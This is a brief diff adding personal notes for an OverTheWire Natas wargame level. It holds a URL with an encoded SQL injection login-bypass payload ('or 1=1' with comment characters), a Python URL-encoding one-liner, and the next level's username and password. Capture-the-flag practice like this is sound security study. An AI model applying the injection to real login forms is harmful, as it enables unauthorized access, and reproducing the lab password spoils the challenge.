@@ -1,0 +1,7 @@
+URL http://natas14.natas.labs.overthewire.org/index.php?debug=yes&username=natas14%22%20or%201=1%20;%23%20or%201=1%20--&password=yes%22%20or%201=1
+
+use python -c "import urllib; print urllib.quote('target_url_here')"
+
+USERNAME : natas15
+password : AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
